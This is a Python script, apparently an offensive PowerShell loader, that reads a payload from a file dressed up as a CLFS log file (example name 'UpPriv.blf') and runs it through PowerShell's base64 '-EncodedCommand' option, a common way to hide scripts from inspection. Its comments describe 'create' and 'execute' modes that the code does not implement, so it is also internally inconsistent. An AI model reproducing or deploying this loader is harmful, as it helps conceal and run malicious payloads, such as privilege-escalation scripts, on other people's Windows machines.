import subprocess
import base64
import sys
import os
import shutil
# This script is a PowerShell loader that executes a PowerShell script encoded in Base64.
# It loads the script from a specified file, encodes it, and executes it using PowerShell.
# It also includes error handling for file operations and PowerShell execution.
def encode_powershell_script(script: str) -> str:
    """
    Encodes a PowerShell script into Base64 for execution.
    """
    try:
        script_bytes = script.encode('utf-16le')
        return base64.b64encode(script_bytes).decode('utf-8')
    except Exception as e:
        raise ValueError(f"Failed to encode the PowerShell script: {e}")

def execute_powershell(encoded_script: str):
    """
    Executes a Base64-encoded PowerShell script using PowerShell on Windows.
    """
    try:
        if not shutil.which("powershell"):
            raise FileNotFoundError("PowerShell is not available on this system.")

        command = ["powershell", "-NoProfile", "-EncodedCommand", encoded_script]
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Error executing PowerShell script: {e}")
    except FileNotFoundError as e:
        print(f"[-] {e}")

def load_clfs_payload(clfs_path: str) -> str:
    """
    Loads the CLFS payload from the specified file.
    Assumes it's a text-based PowerShell script.
    """
    if not os.path.exists(clfs_path):
        raise FileNotFoundError(f"CLFS file not found: {clfs_path}")

    with open(clfs_path, "r", encoding="utf-8") as file:
        payload = file.read()

    if not payload.strip().startswith("function") and not payload.strip().startswith("$"):
        raise ValueError("The CLFS file does not contain a valid PowerShell script.")

    print(f"[+] Loaded PowerShell script from {clfs_path}")
    return payload
# To Create a CLFS file, "python MergedPSLoader.py create"
# To execute the CLFS file, "python MergedPSLoader.py execute <path_to_clfs_file>"
def main():
    if len(sys.argv) != 2:
        print("Usage: python PSLoader.py <path_to_clfs_file>")
        print("Example: python PSLoader.py C:\\path\\to\\UpPriv.blf")
        sys.exit(1)

    clfs_path = sys.argv[1]

    try:
        powershell_script = load_clfs_payload(clfs_path)
        encoded_script = encode_powershell_script(powershell_script)

        print("[+] Executing PowerShell payload...")
        execute_powershell(encoded_script)
        print("[+] PowerShell payload executed successfully.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()